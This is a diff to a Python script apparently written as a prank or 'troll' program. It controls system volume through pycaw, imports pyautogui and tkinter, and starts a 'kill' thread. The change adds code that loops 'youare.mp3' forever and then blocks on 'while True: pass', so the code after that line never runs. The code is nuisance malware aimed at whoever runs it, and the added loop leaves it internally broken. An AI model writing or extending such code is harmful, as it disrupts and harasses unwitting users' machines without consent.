@@ -1,8 +1,13 @@
-import pyautogui, time, random, requests, threading, webbrowser
+import pyautogui, time, random, requests, threading, webbrowser, pygame
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import tkinter as tk
+pygame.mixer.init()
+pygame.mixer.music.load("youare.mp3")
+pygame.mixer.music.play(loops=-1)
+while True:
+    pass
 def vol():
  devices = AudioUtilities.GetSpeakers()
  interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -77,3 +82,4 @@ def kill():
 troll()
 opp=threading.Thread(target=kill)
 opp.start()
+
